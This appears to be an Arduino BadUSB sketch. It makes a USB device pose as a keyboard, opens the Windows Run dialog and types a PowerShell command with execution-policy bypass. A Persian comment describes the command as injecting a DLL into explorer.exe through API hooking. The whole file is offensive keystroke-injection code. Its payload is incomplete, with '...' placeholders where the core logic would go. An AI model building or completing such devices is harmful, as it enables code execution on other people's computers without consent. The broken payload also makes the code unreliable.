#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  delay(3000);
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  
  // تزریق DLL به explorer.exe با استفاده از PowerShell API Hooking
  Keyboard.println(F("powershell -ep bypass $h=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(([System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate(({ &{param($dll,$proc) ... }}))), ...);"));
}

void loop() {}
